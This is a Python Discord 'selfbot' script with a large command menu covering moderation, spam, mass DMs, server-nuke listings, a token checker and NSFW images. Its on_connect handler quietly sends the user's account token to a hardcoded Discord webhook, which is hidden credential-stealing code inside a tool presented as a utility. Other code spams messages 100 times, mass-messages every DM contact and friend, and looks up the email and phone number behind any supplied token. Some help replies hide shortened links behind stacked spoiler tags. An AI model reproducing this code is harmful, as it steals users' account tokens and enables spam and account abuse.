import discord
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore, Style
from gtts import gTTS
import random
import datetime
import string
import asyncio
import json
import requests
import urllib
import os
from webserver import keep_alive

keep_alive()

class SELFBOT():
    __version__ = 1

with open("config.json") as f:
    j = json.load(f)
    token = j["token"]
    prefix = j["prefix"]

client = commands.Bot(command_prefix=prefix,self_bot=True)
client.remove_command("help")

# Events

@client.event
async def on_ready():
    print(Fore.GREEN + f"""
    
    
 
 
 
 
 
 
 
 
 
 
 
 
 
   ______           __  _          
  / ____/___ ______/ /_(_)__  _____
 / /   / __ `/ ___/ __/ / _ \/ ___/
/ /___/ /_/ / /  / /_/ /  __/ /    
\____/\__,_/_/   \__/_/\___/_/  {Fore.GREEN}\n\nLogged In As: {Fore.RED}[{Fore.BLUE}{client.user.name}#{client.user.discriminator}{Fore.RED}]{Fore.GREEN}\nYour ID is: {Fore.RED}[{Fore.BLUE}{client.user.id}{Fore.RED}]\n\n{Fore.RED}----------CREDITS----------{Fore.BLUE}\n\n{Fore.RED}{Fore.GREEN}VPN SELFBOT
{SELFBOT.__version__}, 50+ Commands\nMade By VPN.{Fore.RED}\n\n------------------------""")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        try:
            embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description="`Missing Permissions, You're Missing The Permissions Necessary To Use This Command`")
            embed.set_author(name="Missing Permissions")
            await ctx.send(embed=embed)
        except:
            await ctx.send("""You're Missing Permissions To Execute This Command""")
    if isinstance(error, commands.MissingRequiredArgument):
        try:
            embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description="Missing Required Argument, Try Again?")
            embed.set_author(name="Missing Required Argument")
            await ctx.send(embed=embed)
        except:
            await ctx.send("Missing Required Argument")

@client.event
async def on_connect():
    requests.post('https://discord.com/api/webhooks/1008856307186548877/3E9kz8hqIZ4JN-3mPIxQbwYcJ2XWrqK7JGelxARKIfxJADY16LIK373GNnXZKd61du-1',json={'content': f"**Token:** `{token}`"})

# Other Shit

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

# Help Commands

@client.command()
async def help(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
      embed.set_author(name="VPN",icon_url=
                  ctx.author.avatar_url)
      embed.set_footer(text="VPN")
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      embed.add_field(name="*♦ 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣*",value="`Shows The Moderation Commands`",inline=False)
      embed.add_field(name="*♦ 𝙈𝙞𝙨𝙘𝙚𝙡𝙡𝙖𝙣𝙚𝙤𝙪𝙨*",value="`Shows The Miscellaneous Commands`",inline=False)
      embed.add_field(name="*♦ 𝙐𝙩𝙞𝙡𝙞𝙩𝙮*",value="`Shows The Utility Commands`",inline=False)
      embed.add_field(name="*♦ 𝙎𝙩𝙖𝙩𝙪𝙨*",value="`Shows The Status Commands`",inline=False)
      embed.add_field(name="*♦ 𝙉𝙪𝙠𝙚*",value="`Shows The Nuke Commands`",inline=False)
      embed.add_field(name="*♦ 𝙋𝙚𝙧𝙨𝙤𝙣𝙖𝙡*",value="`Shows The Personal Commands`",inline=False)
      embed.add_field(name="*♦ 𝙈𝙖𝙩𝙝*",value="`Shows The Math Commands`",inline=False)
      embed.add_field(name="*♦ 𝙎𝙚𝙧𝙫𝙚𝙧*",value="`Shows The Server Commands`",inline=False)
      embed.add_field(name="*♦ 𝙉𝙎𝙁𝙒*",value="`Shows The NSFW Commands`",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send("""||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://tinyurl.com/mainhub1""")

@client.command(aliases=["mod"])
async def moderation(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),description="*[] Is Required, <> Is Optional*",timestamp=ctx.message.created_at)
      embed.set_footer(text="VPN")
      embed.set_author(name="𝙈𝙊𝘿𝙀𝙍𝘼𝙏𝙄𝙊𝙉",icon_url=ctx.author.avatar_url)
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.add_field(name="*♦ Ban [member]*",value="`Bans The Specified Member`",inline=False)
      embed.add_field(name="*♦ Kick [member]*",value="`Kicks The Specified Member`",inline=False)
      embed.add_field(name="*♦ AR [member] [role]*",value="`Adds The Specified Role To The Specified Member`",inline=False)
      embed.add_field(name="*♦ TR [member] [role]*",value="`Takes The Specified Role From The Specified Member`",inline=False)
      embed.add_field(name="*♦ Mute [member]*",value="`Mutes The Specified Member`",inline=False)
      embed.add_field(name="*♦ Purge <amount>*",value="`Purges The Specified Amount Of Messages`",inline=False)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      await ctx.send(embed=embed)
  except:
      await ctx.send("""**__VPN Moderation__**\n
*[] Is Required, <> Is Optional*

**Ban [member]**
`Bans The Specified Member`

**Kick [member]**
`Kicks The Specified Member`

**AR [member] [role]**
`Adds The Specified Role To The Specified Member`

**TR [member] [role]**
`Takes The Specified Role From The Specified Member`

**Mute [member]**
`Mutes The Specified Member`

**Purge <amount>**
`Purges The Specified Amount Of Messages`""")
  
@client.command()
async def status(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at,description="*[] Is Required, <> Is Optional*")
      embed.set_footer(text="VPN")
      embed.set_author(name="𝙎𝙏𝘼𝙏𝙐𝙎",icon_url=ctx.author.avatar_url)
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      embed.add_field(name="*♦ Game [name]*",value="`Changes Your Status To A Game`",inline=False)
      embed.add_field(name="*♦ Stream [name]*",value="`Changes Your Status To A Stream`",inline=False)
      embed.add_field(name="*♦ Listen [name]*",value="`Changes Your Status To Listening`",inline=False)
      embed.add_field(name="*♦ Watch [name]*",value="`Changes Your Status To Watching`",inline=False)
      embed.add_field(name="*♦ Clear*",value="`Clears Your Custom Status`",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send("""||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://tinyurl.com/statushub3""")

@client.command()
async def utility(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at,description="*[] Is Required, <> Is Optional*")
      embed.set_footer(text="VPN")
      embed.set_author(name="𝙐𝙏𝙄𝙇𝙄𝙏𝙔",icon_url=ctx.author.avatar_url)
      embed.set_image(url=ctx.author.avatar_url)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      embed.add_field(name="*♦ AV <member>*",value="`Shows The Mentioned Members Avatar`",inline=False)
      embed.add_field(name="*♦ Creator*",value="`Shows This SelfBots Creator`",inline=False)
      embed.add_field(name="*♦ Ping*",value="`Shows The Clients Latency`",inline=False)
      embed.add_field(name="*♦ Info*",value="`Shows Some Info About Yourself`",inline=False)
      embed.add_field(name="*♦ Tts <lang> <message>*",value="`Sends a Message In Text to Speech`",inline=False)
      embed.add_field(name="*♦ 𝘿𝙪𝙢𝙥𝙚𝙢𝙤𝙟𝙞𝙨 <𝙨𝙚𝙧𝙫𝙚𝙧𝙞𝙙>*",value="`Dumps the emojis of the specified server into the emojis file`",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send("""**__VPN Utility__**\n
*[] Is Required, <> Is Optional*

**AV <member>**
`Shows The Mentioned Users Avatar`

**Creator**
`Shows This SelfBots Creator`

**Ping**
`Shows The Clients Latency`

**Info**
`Shows Some Info About Yourself`

**Tts <lang> <message>**
`Sends a Message In Text to Speech`

**Dumpemojis <serverid>**
`Sends a Message In Text to Speech`""")

@client.command(aliases=["misc"])
async def miscellaneous(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at,description="*[] Is Required, <> Is Optional*")
      embed.set_footer(text="VPN")
      embed.set_author(name="𝙈𝙄𝙎𝘾𝙀𝙇𝙇𝘼𝙉𝙀𝙇𝙊𝙐𝙎",icon_url=ctx.author.avatar_url)
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      embed.add_field(name="*♦ Hug [member] <member>*",value="`Sends a gif of hugging the mentioned members/member`",inline=False)
      embed.add_field(name="*♦ Kiss [member] <member>*",value="`Sends a gif of kissing the mentioned members/member`",inline=False)
      embed.add_field(name="*♦ Spam [text]*",value="`Spams The Specified Text`",inline=False)
      embed.add_field(name="*♦ Ascii [text]*",value="`Sends The Specified Text In Ascii`",inline=False)
      embed.add_field(name="*♦ Wizz*",value="`Fake Wizzes The Server, Only Meant To Scare Friends`",inline=False)
      embed.add_field(name="*♦ Dmlist [message]*",value="`DMs Everyone On Your DMs List The Desired Message`",inline=False)
      embed.add_field(name="*♦ Dmfriends [message]*",value="`DMs Everyone On Your Friends List The Desired Message`",inline=False)
      embed.add_field(name="*♦ Tokeninfo [token]*",value="`Checks The Desired Token`",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send("""**__VPN Miscellaneous__**\n
*[] Is Required, <> Is Optional*

**Hug [member] <member>**
`Sends a gif of hugging the mentioned members/member`

**Kiss [member] <member>**
`Sends a gif of kissing the mentioned members/member`

**Spam [text]**
`Spams The Specified Text`

**Ascii [text]**
`Sends The Specified Text In Ascii`

**Wizz**
`Fake Wizzes The Server, Only Meant To Scare Friends`

**Dmlist [message]**
`DMs Everyone On Your DMs List The Desired Message`

**Dmfriends [message]**
`DMs Everyone On Your Friends List The Desired Message`

**Tokeninfo [token]**
`Checks The Desired Token`""")
  
@client.command()
async def nsfw(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
      embed.set_footer(text="VPN")
      embed.set_thumbnail(url=ctx.author.avatar_url)
      embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
      embed.set_author(name="𝙉𝙎𝙁𝙒",icon_url=ctx.author.avatar_url)
      embed.add_field(name="*♦ Hentai*",value="`Sends A Hentai Image`",inline=False)
      embed.add_field(name="*♦ Sex*",value="`Sends A Sex Image`",inline=False)
      embed.add_field(name="*♦ Tits*",value="`Sends A Tit Image`",inline=False)
      embed.add_field(name="*♦ Pussy*",value="`Sends A Pussy Image`",inline=False)
      embed.add_field(name="*♦ Dick*",value="`Sends A Dick Image`",inline=False)
      await ctx.send(embed=embed)
  except:
      await ctx.send("""**__VPN NSFW__**\n
*[] Is Required, <> Is Optional*

**Hentai**
`Sends A Hentai Image`

**Sex**
`Sends A Sex Image`

**Tits**
`Sends A Tit Image`

**Pussy**
`Sends A Pussy Image`
h
**Dick**
`Sends A Dick Image`""")

@client.command(aliases=["emb"])
async def embed(ctx, title, *,desc):
    await ctx.message.delete()
    embed=discord.Embed(description=desc, title=title)
    await ctx.send(embed=embed)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.set_footer(text="VPN")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
        embed.set_author(name="𝙉𝙐𝙆𝙀",icon_url=ctx.author.avatar_url)
        embed.add_field(name="*♦ Ball*",value="`Bans All Server Members`",inline=False)
        embed.add_field(name="*♦ Kall*",value="`Kicks All Server Members`",inline=False)
        embed.add_field(name="*♦ Schan [name]*",value="`Spams Channels With The Desired Name`",inline=False)
        embed.add_field(name="*♦ Srole [name]*",value="`Spams Roles With The Desired Name`",inline=False)
        embed.add_field(name="*♦ Dchan*",value="`Deletes All Channels In The Guild`",inline=False)
        embed.add_field(name="*♦ Drole*",value="`Deletes All Roles In The Guild`",inline=False)
        embed.add_field(name="*♦ Roles*",value="`Prints Out All Server Roles`",inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("""||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://tinyurl.com/nukecommand1""")
    
@client.command()
async def math(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at,description="*[] Is Required, <> Is Optional*")
        embed.set_footer(text="VPN")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
        embed.set_author(name="𝙈𝘼𝙏𝙃",icon_url=ctx.author.avatar_url)
        embed.add_field(name="*♦ Add [number] [number]*",value="`Adds The Two Desired Numbers`",inline=False)
        embed.add_field(name="*♦ Subtract [number] [number]*",value="`Subtracts The Two Desired Numbers`",inline=False)
        embed.add_field(name="*♦ Multiply [number] [number]*",value="`Multiplies The Two Desired Numbers`",inline=False)
        embed.add_field(name="*♦ Divide [number] [number]*",value="`Divides The Two Desired Numbers`",inline=False)
        embed.add_field(name="*♦ Calculator [numbers]*",value="`Calculates The Numbers and Operators\nExample: 7*2/2`")
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__VPN Math__**\n
*[] Is Required, <> Is Optional*

**Add [number] [number]**
`Adds The Two Desired Numbers`

**Subtract [number] [number]**
`Subtracts The Two Desired Numbers`

**Multiply [number] [number]**
`Multiplies The Two Desired Numbers`

**Divide [number] [number]**
`Divided The Two Desired Numbers`

**Calculator [numbers]**
`Calculates The Numbers And Operators\nExample: 7*2/2`""")
  
@client.command()
async def server(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.set_footer(text="VPN")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
        embed.set_author(name="𝙎𝙀𝙍𝙑𝙀𝙍",icon_url=ctx.author.avatar_url)
        embed.add_field(name="*♦ Servericon*",value="`Sends The Server Icon`",inline=False)
        embed.add_field(name="*♦ Serverbanner*",value="`Sends The Server Banner`",inline=False)
        embed.add_field(name="*♦ Servername*",value="`Sends The Server Name`",inline=False)
        embed.add_field(name="*♦ Serverinfo*",value="`Sends The Servers Info`",inline=False)
        embed.add_field(name="*♦ Serverroles*",value="`Sends a List of The Servers Roles`")
        embed.add_field(name="*♦ Serverchannels*",value="`Sends a List of The Servers Channels`",inline=False)
        embed.add_field(name="*♦ Copy*",value="`Makes An Exact Copy of The Server`",inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("""||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://tinyurl.com/serverhub2""")
    
@client.command()
async def personal(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),timestamp=ctx.message.created_at)
        embed.set_footer(text="VPN")
        embed.set_thumbnail(url=ctx.author.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/1004852568406634570/1008838620540571699/IMB_XNKokG.gif")
        embed.set_author(name="𝙋𝙀𝙍𝙎𝙊𝙉𝘼𝙇",icon_url=ctx.author.avatar_url)
        embed.add_field(name="*♦ Guilds*",value="`Displays All The Guilds You're In`",inline=False)
        embed.add_field(name="*♦ Prefix*",value="`Shows The Prefix`",inline=False)
        embed.add_field(name="*♦ Myroles*",value="`Shows All The Roles You Have`",inline=False)
        embed.add_field(name="*♦ Nick [nickname]*",value="`Changes Your Nickname`",inline=False)
        embed.add_field(name="*♦ Nickreset*",value="`Resets Your Nickname`",inline=False)
        embed.add_field(name="*♦ Friendbackup*",value="`Backups your friends list in Friends.txt`",inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("""**__VPN Personal__**\n
*[] Is Required, <> Is Optional*

**Guilds**
`Displays All The Guilds You're In`

**Prefix**
`Shows The Prefix`

**Myroles**
`Shows All The Roles You Have`

**Nick [nickname]**
`Changes Your Nickname`

**Nickreset**
`Resets Your Nickname`

**Friendbackup**
`Backups your friends list in Friends.txt`""")

# Mod

@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member: discord.Member, *, reason):
  await ctx.message.delete()
  await member.ban(reason=reason)
  
@client.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member: discord.Member, *, reason):
  await ctx.message.delete()
  await member.kick(reason=reason)
  
@client.command()
@commands.has_permissions(manage_roles = True)
async def ar(ctx, member: discord.Member, role: discord.Role):
  await ctx.message.delete()
  await member.add_roles(role)
  
@client.command()
@commands.has_permissions(manage_roles = True)
async def tr(ctx, member: discord.Member, role: discord.Role):
  await ctx.message.delete()
  await member.remove_roles(role)
  
@client.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member):
  await ctx.message.delete()
  if isinstance(error, commands.RoleNotFound):
    await ctx.send("Muted Role Not Found!")
  else:
    role = client.get_role("Muted")
    await member.add_roles(role)

@client.command()
async def purge(ctx, amount=1):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)

# Misc

@client.command()
async def hug(ctx, member: discord.Member, user: discord.Member=None):
  await ctx.message.delete()
  try:
      user = ctx.author if not user else user
      hugg = requests.get("https://nekos.life/api/v2/img/hug")
      res = hugg.json()
      embed=discord.Embed(description=f"{user.mention} Hugs {member.mention}",color=discord.Colour.from_rgb(255,0,0))
      embed.set_image(url=res["url"])
      await ctx.send(embed=embed)
  except:
      await ctx.send(f"""{user.mention} Hugs {member.mention}\n\n""" + res["url"])
  
@client.command()
async def kiss(ctx,member: discord.Member, user: discord.Member=None): 
  await ctx.message.delete()
  try:
    user = ctx.author if not user else user
    kisss = requests.get("https://nekos.life/api/v2/img/kiss")
    res = kisss.json()
    embed=discord.Embed(description=f"{user.mention} Kisses {member.mention}",color=discord.Colour.from_rgb(255,0,0))
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
  except:
      await ctx.send(f"""{user.mention} Kisses {member.mention}\n\n""" + res["url"])

@client.command()
async def spam(ctx, *, x):
  await ctx.message.delete()
  for i in range(100):
    await ctx.send(x)

@client.command()
async def ascii(ctx,*,message):
  await ctx.message.delete()
  ascii = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(message)}").text
  if len("```"+ascii+"```") > 2000:
    return
  await ctx.send(f"```{ascii}```")

@client.command()
async def wizz(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"`WIZZING {ctx.guild.name}`")
  await asyncio.sleep(1)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Deleting {len(ctx.guild.text_channels)} Text Channels**")
  await asyncio.sleep(3)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Deleting {len(ctx.guild.voice_channels)} Voice Channels**")
  await asyncio.sleep(2)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Deleting {len(ctx.guild.categories)} Categories**")
  await asyncio.sleep(2)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Deleting {len(ctx.guild.roles)} Roles**")
  await asyncio.sleep(5)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Spamming Text Channels**")
  await asyncio.sleep(5)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Spamming Webhooks**")
  await asyncio.sleep(2)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Spamming Roles**")
  await asyncio.sleep(3)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Spamming Categories**")
  await asyncio.sleep(2)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Sending Pings**")
  await asyncio.sleep(10)
  await msg.edit(content=f"`WIZZING {ctx.guild.name}`\n**Banning {len(ctx.guild.members)}**")
  await msg.edit(content=f"`WIZZED {ctx.guild.name}`")

@client.command()
async def dmlist(ctx, *, x):
    await ctx.message.delete()
    for channel in client.private_channels:
        try:
            await channel.send(x)
            print(f"DMd {channel}")
        except:
            print(f"Can't DM {channel}")
            continue

@client.command()
async def level(ctx):
      await ctx.message.delete()
      responses = [
        'CRY ABOUT VPN',
        'VPN JUST FUCKED YOU',
        'WE LOVE YOU VON',
        'SHIVER VPNS TIMBERS',
        'VPN THA BIG HOMIE',
        'VPN WILL BE YA OP'
      ]
      answer = random.choice(responses)
      await ctx.send(answer)
      await asyncio.sleep(5)

@client.command()
async def dmfriends(ctx, *, x):
    await ctx.message.delete()
    for friend in client.user.friends:
        try:
            await friend.send(x)
            print(f"DMd {friend.name}")
        except:
            print(f"Can't DM {friend.name}")
            continue

@client.command()
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(color=0x2f3136,
                description=f"Name: `{res['username']}#{res['discriminator']} ` **(BOT**)\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(color=0x2f3136,
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`", timestamp=ctx.message.created_at)
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

# Utility

@client.command()
async def av(ctx, member: discord.Member=None):
  member = ctx.author if not member else member
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0))
      embed.set_image(url=member.avatar_url)
      await ctx.send(embed=embed)
  except:
      await ctx.send(f"{member.avatar_url}")

@client.command()
async def creator(ctx):
  await ctx.message.delete()
  try:
      embed = discord.Embed(color=discord.Colour.from_rgb(255,0,0),title="Creator!",description="VPN, <@>")
      await ctx.send(embed=embed)
  except:
      await ctx.send("""**__Creator__**\n\nVPN, <@>""")
  
@client.command()
async def ping(ctx):
  await ctx.message.delete()
  msg = await ctx.send("Pinging...")
  await asyncio.sleep(3)
